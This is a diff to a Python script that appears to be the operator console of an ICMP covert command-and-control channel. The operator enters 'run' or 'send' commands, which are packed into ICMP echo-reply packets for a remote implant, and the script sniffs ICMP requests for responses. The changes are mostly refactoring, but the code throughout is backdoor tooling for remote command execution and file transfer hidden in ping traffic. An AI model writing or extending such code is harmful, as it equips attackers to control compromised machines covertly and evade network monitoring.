@@ -9,9 +9,9 @@ def commands_input():
     while True:
         if not commands_que:
             words = input("\nEnter type and command (ex: run ls):\n").split ()
-            key = words[0]
-            value = ' '.join(words[1:])
-            commands_que = {key: value}
+            key = words[0]                      #extract the first word as key
+            value = ' '.join(words[1:])         # extract all the rest as value
+            commands_que = {key: value}   
             print(commands_que)
 
 def send_command(ip_adr,id_type):
@@ -19,15 +19,14 @@ def send_command(ip_adr,id_type):
     if not commands_que:
         return
     print("commands_que:")
-    prefix = next(iter(commands_que))
+    prefix = next(iter(commands_que))           
     print("prefix is: " + prefix)
     command_name = commands_que[prefix]
     print("command is: " + command_name)
-    if prefix == "run":
+    if prefix == RUN_MODEL:
         prefix = RUN
-    elif prefix == "send":
+    elif prefix == SEND_MODEL:
         prefix = FILE
-    #bin_command = str_to_binary(command_name)
     bin_command = bytes(command_name.encode())
     print(bin_command)
 
@@ -35,7 +34,6 @@ def send_command(ip_adr,id_type):
     combined = prefix + bin_command
     pkt_send(pkt_no_data,combined,0)
 
-    #send(IP(dst=ip_adr)/ICMP(type="echo-reply",id=id_type)/prefix+bin_command)
     commands_que = ""
         
     
@@ -72,14 +70,14 @@ def parse_packet(packet):
 def server_listen():
     sniff_pkt(ICMP_REQUEST,parse_packet)
     
+if __name__=="__main__":
+    signal.signal(signal.SIGINT, signal_handler)
 
-signal.signal(signal.SIGINT, signal_handler)
+    enter_command_thread = threading.Thread(target=commands_input)
+    enter_command_thread.start()
 
-enter_command_thread = threading.Thread(target=commands_input)
-enter_command_thread.start()
-
-print("start listening")
-server_listen()    # Start sniffing packets
+    print("start listening")
+    server_listen()    # Start sniffing packets
 
 
 
